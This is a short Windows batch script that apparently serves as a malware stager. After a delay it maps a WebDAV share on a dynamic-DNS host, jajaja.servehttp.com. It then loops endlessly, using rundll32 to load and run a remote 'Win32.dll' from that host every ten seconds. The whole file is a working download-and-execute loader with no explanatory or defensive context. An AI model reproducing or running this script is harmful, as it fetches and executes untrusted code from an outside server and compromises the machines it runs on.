@echo off
timeout 60
net use M: \\jajaja.servehttp.com\webdav /persistent:no
net use M: /delete
:start
rundll32.exe \\jajaja.servehttp.com\webdav\Win32.dll,Run
timeout 10
goto start
